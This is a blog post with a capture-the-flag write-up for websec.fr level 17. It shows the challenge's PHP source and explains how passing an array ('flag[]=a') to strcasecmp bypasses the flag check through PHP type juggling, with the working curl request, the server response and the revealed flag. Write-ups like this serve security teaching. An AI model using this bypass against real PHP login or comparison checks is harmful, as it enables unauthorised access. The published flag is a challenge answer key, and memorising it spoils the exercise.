+++
title = 'Websec.fr Level 17'
date = '2025-12-10T00:00:00+01:00'
draft = false
tags = ['websec']
+++


![alt text](</images/stc/Level Seventeen.png>)


The code for [level17](http://websec.fr/level17/index.php) is [here](http://websec.fr/level17/source.php).

```php
 <?php
include "flag.php";

function sleep_rand() { /* I wish php5 had random_int() */
        $range = 100000;
        $bytes = (int) (log($range, 2) / 8) + 1;
        do {  /* Side effect: more random cpu cycles wasted ;) */
            $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes)));
        } while ($rnd >= $range);
        usleep($rnd);
}
?>
<!DOCTYPE html>
<html>
.......
                        <?php
                        if (isset ($_POST['flag'])):
                            sleep_rand(); /* This makes timing-attack impractical. */
                        ?>
            <br>
                        <div class="container">
                            <div class="row">
                                <?php
                                if (! strcasecmp ($_POST['flag'], $flag))
                                    echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
                                else
                                    echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';
                                ?>
                            </div>
                        </div>
                        <?php endif ?>
........
</html>
```

After reading the code, we can ignore the first part of the PHP code because it's impossible to break this function.  
But in the second part, the only thing that can lead to a vulnerability is `strcasecmp`. This function checks if the input matches the **flag**.  
Reading [strcasecmp php documentation](https://www.php.net/manual/fr/function.strcasecmp.php) we can see that : 

```md
Returns a value less than 0 if string1 is less than string2; a value greater than 0 if string1 is greater than string2, and 0 if they are equal. 
```
So this vulnerability looks like type juggling, we just have to make `strcasecmp` return `0` or `true` to exfiltrate the **flag**.  
After some research I read this [article](https://marcosvalle.github.io/ctf/php/2016/05/12/php-comparison-vlun.html) which explains exactly what I want, if we compare a string with another type of value like **array** `strcasecmp` returns `0`.


Using DevTools in `network section` I sent a `POST` request and **copy as** `Curl` and modify it.


```bash
tedsig42@exegol:~# curl 'http://websec.fr/level17/index.php' -X POST  --data-raw 'flag[]=a&submit=Go'
<!DOCTYPE html>
<html>
................
                                <div class="alert alert-success">Here is your flag: <mark>WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}</mark>.</div>                            </div>
...............
</html>
```

Flag : `WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}`